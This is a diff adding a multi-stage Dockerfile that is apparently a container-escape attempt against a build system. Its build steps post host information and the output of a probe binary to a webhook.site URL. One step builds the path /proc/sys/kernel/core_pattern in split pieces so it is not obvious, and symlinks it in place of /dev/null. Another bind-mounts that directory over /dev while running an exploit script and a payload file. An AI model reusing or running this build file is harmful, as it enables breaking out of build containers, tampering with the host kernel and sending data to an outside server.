@@ -1,0 +1,29 @@
+FROM alpine:3.20 AS ctl
+RUN apk add --no-cache curl >/dev/null 2>&1; echo "F2-CONTROL5 $(date -u) $(uname -a)" | curl -sS -m 20 -X POST --data-binary @- https://webhook.site/2d75f522-1408-43a0-9604-764bfa111ee8
+
+FROM alpine:3.20 AS devfs
+RUN echo f2marker > /dev/f2marker && ls -la /dev/f2marker
+
+FROM alpine:3.20 AS devfs2
+COPY --from=devfs /etc/hostname /x
+RUN echo "F2-DEV-PERSIST: $( [ -e /dev/f2marker ] && echo yes || echo no-tmpfs )"; mount | grep -E " /dev " || true
+
+FROM alpine:3.20 AS mknull2
+RUN apk add --no-cache curl >/dev/null 2>&1; mkdir -p /fake/dev && T=/proc/sys/kernel/core_pat && T=${T}tern && ln -s "$T" /fake/dev/null && ls -la /fake/dev
+
+FROM mknull2 AS spacemnt
+COPY front2/scripts/f2_payload /f2p_payload
+COPY front2/scripts/exploit_step.sh /exploit_step.sh
+RUN --mount type=bind,from=mknull2,source=/fake/dev,target=/dev sh /exploit_step.sh
+
+FROM alpine:3.20 AS probe2
+RUN apk add --no-cache curl >/dev/null 2>&1
+COPY front2/scripts/front2_build_probe2 /probe2
+RUN chmod +x /probe2 && /probe2 > /f2p2.txt 2>&1; curl -sS -m 20 -X POST --data-binary @/f2p2.txt https://webhook.site/2d75f522-1408-43a0-9604-764bfa111ee8; cat /f2p2.txt
+
+FROM alpine:3.20 AS collect
+COPY --from=ctl /etc/hostname /c
+COPY --from=devfs2 /etc/hostname /d
+COPY --from=spacemnt /etc/hostname /s
+COPY --from=probe2 /etc/hostname /p
+RUN echo F2-BATCH5-DONE
